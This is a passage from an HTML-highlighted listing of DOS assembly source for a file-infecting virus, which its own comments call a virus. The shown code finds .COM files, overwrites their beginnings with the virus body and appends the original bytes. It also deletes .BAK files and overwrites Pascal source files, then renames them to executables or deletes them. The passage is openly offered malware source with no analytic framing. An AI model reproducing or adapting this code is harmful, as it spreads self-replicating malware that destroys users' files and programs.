    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">40</span><span class="sc0">       </span><span class="sc1">; Write virus body over the</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">start</span><span class="sc0"> </span><span class="sc1">;  first bytes of the file</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc5">sizehld</span><span class="sc0">  </span><span class="sc1">; Number of bytes to write</span><span class="sc0">
    </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">21</span><span class="sc0">      </span><span class="sc1">; Do it</span><span class="sc0">

    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">      </span><span class="sc1">; Restore AX</span><span class="sc0">
    </span><span class="sc6">clc</span><span class="sc0">         </span><span class="sc1">; CF == 0 means infection successfully done</span><span class="sc0">
    </span><span class="sc6">ret</span><span class="sc0">         </span><span class="sc1">; Exit</span><span class="sc0">
</span><span class="sc5">is_inf</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">stc</span><span class="sc0">         </span><span class="sc1">; CF == 1 means file already infected</span><span class="sc0">
    </span><span class="sc6">ret</span><span class="sc0">         </span><span class="sc1">; Exit</span><span class="sc0">

</span><span class="sc5">rename</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">si</span><span class="sc0">      </span><span class="sc1">; Save SI</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">namez</span><span class="sc0"> </span><span class="sc1">; Point SI at file name</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc8">si</span><span class="sc0">       </span><span class="sc1">; Point DX there too</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">f_name</span><span class="sc0">    </span><span class="sc1">; Point DI at the name buffer</span><span class="sc0">

</span><span class="sc5">cpy_name</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">lodsb</span><span class="sc0">           </span><span class="sc1">; Get byte from the file name</span><span class="sc0">
    </span><span class="sc6">stosb</span><span class="sc0">           </span><span class="sc1">; Store it in the name buffer</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc12">'.'</span><span class="sc0">          </span><span class="sc1">; Is all the name (up to the extension) copied?</span><span class="sc0">
    </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">cpy_name</span><span class="sc0">    </span><span class="sc1">; Loop if not</span><span class="sc0">

    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc0">      </span><span class="sc1">; Restore SI</span><span class="sc0">
    </span><span class="sc6">movsw</span><span class="sc0">           </span><span class="sc1">; Copy the new extension</span><span class="sc0">
    </span><span class="sc6">movsb</span><span class="sc0">           </span><span class="sc1">;  into the file name buffer</span><span class="sc0">
    </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">       </span><span class="sc1">; Make the file name ASCIIZ</span><span class="sc0">
    </span><span class="sc6">stosb</span><span class="sc0">           </span><span class="sc1">;  by placing a zero after it</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">56</span><span class="sc0">       </span><span class="sc1">; Now rename the file to the new extension</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">f_name</span><span class="sc0">
    </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">21</span><span class="sc0">      </span><span class="sc1">; Do it</span><span class="sc0">
    </span><span class="sc6">ret</span><span class="sc0">         </span><span class="sc1">; Done. Exit</span><span class="sc0">

</span><span class="sc5">infect</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">com</span><span class="sc0">   </span><span class="sc1">; Find the first .COM file in this dir</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">f_first</span><span class="sc0">
</span><span class="sc5">f_next2</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">21</span><span class="sc0">      </span><span class="sc1">; Do it</span><span class="sc0">
    </span><span class="sc6">jc</span><span class="sc0">  </span><span class="sc5">pass_2</span><span class="sc0">      </span><span class="sc1">; Do damage if no such files</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc5">fsize</span><span class="sc0">   </span><span class="sc1">; Check the size of the file found</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc5">vlen</span><span class="sc0">     </span><span class="sc1">; Less than virus length?</span><span class="sc0">
    </span><span class="sc6">jb</span><span class="sc0">  </span><span class="sc5">next</span><span class="sc0">        </span><span class="sc1">; Too small, don't touch</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">0FFFF</span><span class="sc4">-</span><span class="sc5">vlen</span><span class="sc0">   </span><span class="sc1">; Bigger than 64 K - vlen?</span><span class="sc0">
    </span><span class="sc6">ja</span><span class="sc0">  </span><span class="sc5">next</span><span class="sc0">        </span><span class="sc1">; Too big, don't touch</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc5">flen</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">     </span><span class="sc1">; Save file length</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc5">sizehld</span><span class="sc4">,</span><span class="sc5">vlen</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">wr_body</span><span class="sc0">     </span><span class="sc1">; Write virus body over the file</span><span class="sc0">
    </span><span class="sc6">jc</span><span class="sc0">  </span><span class="sc5">next</span><span class="sc0">        </span><span class="sc1">; Exit on error</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">2</span><span class="sc0">        </span><span class="sc1">; Lseek to file end</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">lseek</span><span class="sc0">       </span><span class="sc1">; Do it</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ds</span><span class="sc0">      </span><span class="sc1">; Save DS</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">,</span><span class="sc5">mem_seg</span><span class="sc0">  </span><span class="sc1">; Write the original bytes from</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc5">vlen</span><span class="sc0">     </span><span class="sc1">;  the file beginning after its end</span><span class="sc0">
    </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc8">dx</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">40</span><span class="sc0">
    </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">21</span><span class="sc0">      </span><span class="sc1">; Do it</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc0">      </span><span class="sc1">; Restore DS</span><span class="sc0">

</span><span class="sc5">close</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">3E</span><span class="sc0">       </span><span class="sc1">; Close the file handle</span><span class="sc0">
    </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">21</span><span class="sc0">      </span><span class="sc1">; Do it</span><span class="sc0">
    </span><span class="sc6">ret</span><span class="sc0">         </span><span class="sc1">; And exit</span><span class="sc0">

</span><span class="sc5">next</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">close</span><span class="sc0">       </span><span class="sc1">; Close the file</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">4F</span><span class="sc0">       </span><span class="sc1">; And go find another one</span><span class="sc0">
    </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">f_next2</span><span class="sc0">

</span><span class="sc5">pass_2</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">bak</span><span class="sc0">   </span><span class="sc1">; Find a *.BAK file</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">f_first</span><span class="sc0">     </span><span class="sc1">; Do it</span><span class="sc0">
    </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">21</span><span class="sc0">
    </span><span class="sc6">jc</span><span class="sc0">  </span><span class="sc5">pas_srch</span><span class="sc0">    </span><span class="sc1">; On error search for *.PAS files</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">namez</span><span class="sc0"> </span><span class="sc1">; Otherwise delete the file</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">41</span><span class="sc0">       </span><span class="sc1">; Do it</span><span class="sc0">
    </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">21</span><span class="sc0">

</span><span class="sc5">pas_srch</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">pas</span><span class="sc0">   </span><span class="sc1">; Find a *.PAS file</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">f_first</span><span class="sc0">     </span><span class="sc1">; Do it</span><span class="sc0">
    </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">21</span><span class="sc0">
    </span><span class="sc6">jc</span><span class="sc0">  </span><span class="sc5">inf_xit</span><span class="sc0">     </span><span class="sc1">; Exit on error</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc5">fsize</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc5">sizehld</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">  </span><span class="sc1">; Save file size</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">wr_body</span><span class="sc0">     </span><span class="sc1">; Overwrite the file with the virus body</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">close</span><span class="sc0">       </span><span class="sc1">; Close it</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">com</span><span class="sc0">   </span><span class="sc1">; Try to rename it as a .COM file</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">rename</span><span class="sc0">      </span><span class="sc1">; Do it</span><span class="sc0">
    </span><span class="sc6">jnc</span><span class="sc0"> </span><span class="sc5">inf_xit</span><span class="sc0">     </span><span class="sc1">; Exit if renaming OK</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">exe</span><span class="sc0">   </span><span class="sc1">; Otherwise try to rename it as an .EXE file</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">rename</span><span class="sc0">      </span><span class="sc1">; Do it</span><span class="sc0">
    </span><span class="sc6">jnc</span><span class="sc0"> </span><span class="sc5">inf_xit</span><span class="sc0">     </span><span class="sc1">; Exit if renaming OK</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">41</span><span class="sc0">       </span><span class="sc1">; Otherwise just delete that stupid file</span><span class="sc0">
    </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">21</span><span class="sc0">      </span><span class="sc1">; Do it</span><span class="sc0">
</span><span class="sc5">inf_xit</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">ret</span><span class="sc0">         </span><span class="sc1">; And exit</span><span class="sc0">

</span><span class="sc5">int_24</span><span class="sc4">:</span><span class="sc0">             </span><span class="sc1">; Critical error handler</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">2</span><span class="sc0">        </span><span class="sc1">; Abort suggested (?!)</span><span class="sc0">
    </span><span class="sc6">iret</span><span class="sc0">            </span><span class="sc1">; Return</span><span class="sc0">

</span><span class="sc5">v_end</span><span class="sc0">   </span><span class="sc4">=</span><span class="sc0">   </span><span class="sc10">$</span><span class="sc0">

</span><span class="sc1">; Here goes the rest of the original program (if any):</span><span class="sc0">

</span><span class="sc1">; And here (after the  end of file) are the overwritten first 529 bytes:</span><span class="sc0">

    </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">quit</span><span class="sc0">        </span><span class="sc1">; The original "program"</span><span class="sc0">

    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc4">(</span><span class="sc2">529d</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc2">8</span><span class="sc4">)</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc2">90</span><span class="sc4">)</span><span class="sc0">

</span><span class="sc5">quit</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">4C00</span><span class="sc0">     </span><span class="sc1">; Just exit</span><span class="sc0">
    </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">21</span><span class="sc0">

</span><span class="sc5">code</span><span class="sc0">    </span><span class="sc9">ends</span><span class="sc0">
    </span><span class="sc9">end</span><span class="sc0"> </span><span class="sc5">start</span><span class="sc0">
</span></div></body>
</html>
